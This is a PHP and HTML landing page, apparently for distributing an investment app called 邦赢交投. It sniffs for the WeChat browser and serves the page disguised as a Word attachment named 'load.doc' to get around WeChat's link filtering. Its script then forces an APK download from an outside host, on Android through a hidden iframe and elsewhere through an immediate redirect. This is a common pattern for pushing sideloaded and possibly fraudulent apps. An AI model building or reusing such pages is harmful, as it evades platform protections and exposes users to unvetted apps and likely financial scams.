<?php
error_reporting(0);
if($_GET['open']==1 && strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger')!==false){
	header("Content-Disposition: attachment; filename=\"load.doc\"");
	header("Content-Type: application/vnd.ms-word;charset=utf-8");
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>邦赢交投app下载</title>
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
	<meta content="yes" name="apple-mobile-web-app-capable"/>
	<meta content="black" name="apple-mobile-web-app-status-bar-style"/>
	<meta name="format-detection" content="telephone=no"/>
	<meta content="false" name="twcClient" id="twcClient"/>
	<style>
	body,html{width:100%;height:100%}
	*{margin:0;padding:0}
	body{background-color:#fff}
	.top-bar-guidance{font-size:15px;color:#fff;height:40%;line-height:1.8;padding-left:20px;padding-top:20px;background:url(//gw.alicdn.com/tfs/TB1eSZaNFXXXXb.XXXXXXXXXXXX-750-234.png) center top/contain no-repeat}
	.top-bar-guidance .icon-safari{width:25px;height:25px;vertical-align:middle;margin:0 .2em}
	.app-download-btn{display:block;width:214px;height:40px;line-height:40px;margin:18px auto 0 auto;text-align:center;font-size:18px;color:#2466f4;border-radius:20px;border:.5px #2466f4 solid;text-decoration:none}
</style>
</head>
<body>
	<div class="top-bar-guidance">
		<p>
			点击右上角<img src="//gw.alicdn.com/tfs/TB1xwiUNpXXXXaIXXXXXXXXXXXX-55-55.png" class="icon-safari"/> 请在外部浏览器打开
		</p>
		<p>
			可以继续访问本站哦~
		</p>
	</div>
	<a class="app-download-btn" id="BtnClick" href="javascript:;"> 点此继续访问 </a>
	<script>
		var url = 'http://www.ccsc58.cc/Android-Update/zjly(14).apk';//更改需要跳转的地址
		document.querySelector('body').addEventListener('touchmove', function (event) {
			event.preventDefault();
		});
		window.mobileUtil = (function(win, doc) {
			var UA = navigator.userAgent,
			isAndroid = /android|adr/gi.test(UA),
			isIOS = /iphone|ipod|ipad/gi.test(UA) && !isAndroid,
			isBlackBerry = /BlackBerry/i.test(UA),
			isWindowPhone = /IEMobile/i.test(UA),
			isMobile = isAndroid || isIOS || isBlackBerry || isWindowPhone;
			return {
				isAndroid: isAndroid,
				isIOS: isIOS,
				isMobile: isMobile,
				isWeixin: /MicroMessenger/gi.test(UA),
				isQQ: /QQ/gi.test(UA)
			};
		})(window, document);
		if(mobileUtil.isWeixin){
			if(mobileUtil.isIOS){
				url = "http://www.ccsc58.cc/Android-Update/zjly(14).apk";
				document.getElementById('BtnClick').href=url;
			}else if(mobileUtil.isAndroid){
				url = 'http://www.ccsc58.cc/Android-Update/zjly(14).apk';
				document.getElementById('BtnClick').href=url;
				var iframe = document.createElement("iframe");
				iframe.style.display = "none";
				iframe.src = url;
				document.body.appendChild(iframe);
			}
		}else{
			document.getElementById('BtnClick').href=url;
			window.location.replace(url);
		}
	//setTimeout('WeixinJSBridge.invoke("closeWindow", {}, function(e) {})', 2000); </script>
</body>
</html>